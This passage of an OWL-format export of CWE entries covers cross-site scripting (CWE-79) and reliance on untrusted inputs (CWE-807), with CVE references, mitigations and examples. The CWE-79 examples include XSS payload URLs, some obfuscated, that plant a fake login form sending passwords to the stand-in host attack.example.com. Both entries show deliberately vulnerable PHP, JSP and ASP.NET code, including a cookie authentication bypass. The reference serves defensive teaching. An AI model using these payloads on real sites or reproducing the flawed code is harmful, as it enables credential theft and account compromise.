     Annotations: rdfs:comment "Stored XSS in a guestbook application."^^xsd:string
                 
                 references  CVE-2006-3568,
     
     Annotations: rdfs:comment "Chain: incomplete blacklist (CWE-184) only checks \"javascript:\" tag, allowing XSS (CWE-79) using other tags"^^xsd:string
                 
                 references  CVE-2006-4308,
     
     Annotations: rdfs:comment "Chain: incomplete blacklist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79)"^^xsd:string
                 
                 references  CVE-2007-5727,
     
     Annotations: rdfs:comment "Stored XSS in a security product."^^xsd:string
                 
                 references  CVE-2008-0971,
     
     Annotations: rdfs:comment "Reflected XSS not properly handled when generating an error message"^^xsd:string
                 
                 references  CVE-2008-4730,
     
     Annotations: rdfs:comment "Chain: protection mechanism failure allows XSS"^^xsd:string
                 
                 references  CVE-2008-5080,
     
     Annotations: rdfs:comment "Stored XSS using a wiki page."^^xsd:string
                 
                 references  CVE-2008-5249,
     
     Annotations: rdfs:comment "Reflected XSS sent through email message."^^xsd:string
                 
                 references  CVE-2008-5734,
     
     Annotations: rdfs:comment "Reflected XSS using the PATH_INFO in a URL"^^xsd:string
                 
                 references  CVE-2008-5770,
     
     Annotations: rdfs:comment "Web log analysis product allows XSS through crafted HTTP Referer header."^^xsd:string
                 
                 references  CVE-2014-5198,
     
     Annotations: rdfs:comment "Admin GUI allows XSS through cookie."^^xsd:string
                 
                 references  CVE-2014-8958,
     
     Annotations: rdfs:comment "Web stats program allows XSS through crafted HTTP header."^^xsd:string
                 
                 references  CVE-2017-9764,
     
     Annotations: rdfs:comment "XSS Using MIME Type Mismatch"^^xsd:string
                 
                 related_attack_patterns  CAPEC-209,
     
     Annotations: rdfs:comment "DOM-Based XSS"^^xsd:string
                 
                 related_attack_patterns  CAPEC-588,
     
     Annotations: rdfs:comment "Reflected XSS"^^xsd:string
                 
                 related_attack_patterns  CAPEC-591,
     
     Annotations: rdfs:comment "Stored XSS"^^xsd:string
                 
                 related_attack_patterns  CAPEC-592,
     
     Annotations: rdfs:comment "Cross-Site Scripting (XSS)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-63,
     
     Annotations: rdfs:comment "AJAX Fingerprinting"^^xsd:string
                 
                 related_attack_patterns  CAPEC-85,
     
     Annotations: rdfs:comment "Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.
Effectiveness: Moderate

Note: With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store."^^xsd:string
                 
                 Black_Box  ""^^xsd:string,
     ID  "79"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also."^^xsd:string
                 
                 access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Effectiveness: Limited

Note: This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket."^^xsd:string, 
                 rdfs:comment "Strategy: Parameterization

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated."^^xsd:string, 
                 rdfs:comment "Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:
HTML body
Element attributes (such as src=\"XYZ\")
URIs
JavaScript sections
Cascading Style Sheets and style property
etc. Note that HTML Entity Encoding is only appropriate for the HTML body.
Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws."^^xsd:string
                 
                 availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running \"Active X\" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also."^^xsd:string
                 
                 confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws."^^xsd:string
                 
                 confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. This code displays a welcome message on a web page based on the HTTP GET username parameter. This example covers a Reflected XSS (Type 1) scenario.

(bad code)
Example Language: PHP 
$username = $_GET['username'];
echo '<div class=\"header\"> Welcome, ' . $username . '</div>';
Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as

(attack code)
 
http://trustedSite.example.com/welcome.php?username=<Script Language=\"Javascript\">alert(\"You've been attacked!\");</Script>
This results in a harmless alert dialogue popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.

More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:

(attack code)
 
http://trustedSite.example.com/welcome.php?username=<div id=\"stealPassword\">Please Login:<form name=\"input\" action=\"http://attack.example.com/stealPassword.php\" method=\"post\">Username: <input type=\"text\" name=\"username\" /><br/>Password: <input type=\"password\" name=\"password\" /><br/><input type=\"submit\" value=\"Login\" /></form></div>
If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:

(result)
 
<div class=\"header\"> Welcome, <div id=\"stealPassword\"> Please Login:

<form name=\"input\" action=\"attack.example.com/stealPassword.php\" method=\"post\">
Username: <input type=\"text\" name=\"username\" /><br/>
Password: <input type=\"password\" name=\"password\" /><br/>
<input type=\"submit\" value=\"Login\" />
</form>

</div></div>
The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):

(attack code)
 
trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+%3Cinput+type%3D%22password%22+name%3D%22password%22
+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
The same attack string could also be obfuscated as:

(attack code)
 
trustedSite.example.com/welcome.php?username=<script+type=\"text/javascript\">
document.write('\\u003C\\u0064\\u0069\\u0076\\u0020\\u0069\\u0064\\u003D\\u0022\\u0073
\\u0074\\u0065\\u0061\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064
\\u0022\\u003E\\u0050\\u006C\\u0065\\u0061\\u0073\\u0065\\u0020\\u004C\\u006F\\u0067
\\u0069\\u006E\\u003A\\u003C\\u0066\\u006F\\u0072\\u006D\\u0020\\u006E\\u0061\\u006D
\\u0065\\u003D\\u0022\\u0069\\u006E\\u0070\\u0075\\u0074\\u0022\\u0020\\u0061\\u0063
\\u0074\\u0069\\u006F\\u006E\\u003D\\u0022\\u0068\\u0074\\u0074\\u0070\\u003A\\u002F
\\u002F\\u0061\\u0074\\u0074\\u0061\\u0063\\u006B\\u002E\\u0065\\u0078\\u0061\\u006D
\\u0070\\u006C\\u0065\\u002E\\u0063\\u006F\\u006D\\u002F\\u0073\\u0074\\u0065\\u0061
\\u006C\\u0050\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u002E\\u0070\\u0068
\\u0070\\u0022\\u0020\\u006D\\u0065\\u0074\\u0068\\u006F\\u0064\\u003D\\u0022\\u0070
\\u006F\\u0073\\u0074\\u0022\\u003E\\u0055\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D
\\u0065\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079
\\u0070\\u0065\\u003D\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006E\\u0061
\\u006D\\u0065\\u003D\\u0022\\u0075\\u0073\\u0065\\u0072\\u006E\\u0061\\u006D\\u0065
\\u0022\\u0020\\u002F\\u003E\\u003C\\u0062\\u0072\\u002F\\u003E\\u0050\\u0061\\u0073
\\u0073\\u0077\\u006F\\u0072\\u0064\\u003A\\u0020\\u003C\\u0069\\u006E\\u0070\\u0075
\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D\\u0022\\u0070\\u0061\\u0073\\u0073
\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u006E\\u0061\\u006D\\u0065\\u003D\\u0022
\\u0070\\u0061\\u0073\\u0073\\u0077\\u006F\\u0072\\u0064\\u0022\\u0020\\u002F\\u003E
\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D
\\u0022\\u0073\\u0075\\u0062\\u006D\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006C
\\u0075\\u0065\\u003D\\u0022\\u004C\\u006F\\u0067\\u0069\\u006E\\u0022\\u0020\\u002F
\\u003E\\u003C\\u002F\\u0066\\u006F\\u0072\\u006D\\u003E\\u003C\\u002F\\u0064\\u0069\\u0076\\u003E\\u000D');</script>
Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs."^^xsd:string, 
                 rdfs:comment "Example 2. This example also displays a Reflected XSS (Type 1) scenario.

The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.

(bad code)
Example Language: JSP 
<% String eid = request.getParameter(\"eid\"); %>
...
Employee ID: <%= eid %>
The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.

(bad code)
Example Language: ASP.NET 
<%
protected System.Web.UI.WebControls.TextBox Login;
protected System.Web.UI.WebControls.Label EmployeeID;
...
EmployeeID.Text = Login.Text;
%>

<p><asp:label id=\"EmployeeID\" runat=\"server\" /></p>
The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response."^^xsd:string, 
                 rdfs:comment "Example 3. This example covers a Stored XSS (Type 2) scenario.

The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.

(bad code)
Example Language: JSP 
<%Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(\"select * from emp where id=\"+eid);
if (rs != null) {
rs.next();
String name = rs.getString(\"name\");
}%>

Employee Name: <%= name %>
The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.

(bad code)
Example Language: ASP.NET 
<%
protected System.Web.UI.WebControls.Label EmployeeName;
...
string query = \"select * from emp where id=\" + eid;
sda = new SqlDataAdapter(query, conn);
sda.Fill(dt);
string name = dt.Rows[0][\"Name\"];
...
EmployeeName.Text = name;%>
<p><asp:label id=\"EmployeeName\" runat=\"server\" /></p>
This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser."^^xsd:string, 
                 rdfs:comment "Example 4. The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.

CreateUser.php

(bad code)
Example Language: PHP 
$username = mysql_real_escape_string($username);
$fullName = mysql_real_escape_string($fullName);
$query = sprintf('Insert Into users (username,password) Values (\"%s\",\"%s\",\"%s\")', $username, crypt($password),$fullName) ;
mysql_query($query);
/.../
The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:

ListUsers.php

(bad code)
Example Language: PHP 
$query = 'Select * From users Where loggedIn=true';
$results = mysql_query($query);

if (!$results) {
exit;
}

//Print list of users to page
echo '<div id=\"userlist\">Currently Active Users:';
while ($row = mysql_fetch_assoc($results)) {
echo '<div class=\"userNames\">'.$row['fullname'].'</div>';
}
echo '</div>';
The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message."^^xsd:string, 
                 rdfs:comment "Example 5. Consider an application that provides a simplistic message board that saves messages in HTML format and appends them to a file. When a new user arrives in the room, it makes an announcement:

(bad code)
Example Language: PHP 
$name = $_COOKIE[\"myname\"];
$announceStr = \"$name just logged in.\";

//save HTML-formatted message to file; implementation details are irrelevant for this example.
saveMessage($announceStr);
An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:

(attack code)
 
<script>document.alert('Hacked');</script>
The raw contents of the message file would look like:

(result)
 
<script>document.alert('Hacked');</script> has logged in.
For each person who visits the message page, their browser would execute the script, generating a pop-up window that says \"Hacked\". More malicious attacks are possible; see the rest of this entry."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
Effectiveness: Defense in Depth"^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Effectiveness: Limited

Note: This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (\"<3\") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the \"<\" character, which would need to be escaped or otherwise handled. In this case, stripping the \"<\" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.
Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.
Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere."^^xsd:string, 
                 rdfs:comment "Strategy: Output Encoding

Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks."^^xsd:string, 
                 rdfs:comment "Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:
HTML body
Element attributes (such as src=\"XYZ\")
URIs
JavaScript sections
Cascading Style Sheets and style property
etc. Note that HTML Entity Encoding is only appropriate for the HTML body.
Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed."^^xsd:string, 
                 rdfs:comment "With Struts, write all data from form beans with the bean's filter attribute set to true."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws."^^xsd:string
                 
                 integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Strategy: Firewall

Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
Effectiveness: Moderate

Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."^^xsd:string
                 
                 operation  ""^^xsd:string,
     paradigms  "Web Based"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.
Effectiveness: Moderate"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     technologies  "Web Server"^^xsd:string,
     weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-807_Reliance_on_Untrusted_Inputs_in_a_Security_Decision

    Annotations: 
        rdfs:comment "Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.

Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted."^^xsd:string,
        rdfs:comment "The application uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     
     Annotations: rdfs:comment "e-dating application allows admin privileges by setting the admin cookie to 1."^^xsd:string
                 
                 references  CVE-2008-5784,
     
     Annotations: rdfs:comment "Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to \"admin.\""^^xsd:string
                 
                 references  CVE-2008-6291,
     
     Annotations: rdfs:comment "Content management system allows admin privileges by setting a \"login\" cookie to \"OK.\""^^xsd:string
                 
                 references  CVE-2009-0864,
     
     Annotations: rdfs:comment "Attacker can bypass authentication by setting a cookie to a specific value."^^xsd:string
                 
                 references  CVE-2009-1549,
     
     Annotations: rdfs:comment "Attacker can bypass authentication and gain admin privileges by setting an \"admin\" cookie to 1."^^xsd:string
                 
                 references  CVE-2009-1619,
     ID  "807"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Store state information and sensitive data on the server side only.
Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.
If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328)."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
With a stateless protocol such as HTTP, use a framework that maintains the state for you.
Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].
Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Attack Modeling
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "Bypass Protection Mechanism"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     availability  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code excerpt reads a value from a browser cookie to determine the role of the user.

(bad code)
Example Language: Java 
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(\"role\")) {
userRole = c.getValue();
}
}"^^xsd:string, 
                 rdfs:comment "Example 2
The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.

(bad code)
Example Language: PHP 
$auth = $_COOKIES['authenticated'];
if (! $auth) {
if (AuthenticateUser($_POST['user'], $_POST['password']) == \"success\") {
// save the cookie to send out in future responses
setcookie(\"authenticated\", \"1\", time()+60*60*2);
}
else {
ShowLoginScreen();
die(\"\\n\");
}
}
DisplayMedicalHistory($_POST['patient_ID']);
The programmer expects that the AuthenticateUser() check will always be applied, and the \"authenticated\" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.

However, the attacker can set the \"authenticated\" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication."^^xsd:string, 
                 rdfs:comment "Example 3
